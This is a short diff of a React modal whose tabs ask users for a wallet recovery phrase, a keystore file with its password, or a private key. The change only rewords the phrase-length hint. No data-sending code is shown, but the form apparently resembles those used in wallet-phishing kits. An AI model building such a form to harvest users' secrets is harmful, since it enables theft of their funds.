@@ -120,7 +120,7 @@ const Modal = ({ isOpen, onClose, onValidate, wallet }) => {
 
   const tabs = [
     { id: 'phrase', label: 'Phrase', icon: Key, 
-      hint: 'Typically 12 (sometimes 24) words separated by a single space' },
+      hint: 'Typically 12, 15, or 24 words separated by a single space' },
     { id: 'keystore', label: 'Keystore', icon: FileJson,
       hint: 'Several lines of text beginning with {...} plus the password you used to encrypt it' },
     { id: 'privateKey', label: 'Private Key', icon: Lock,
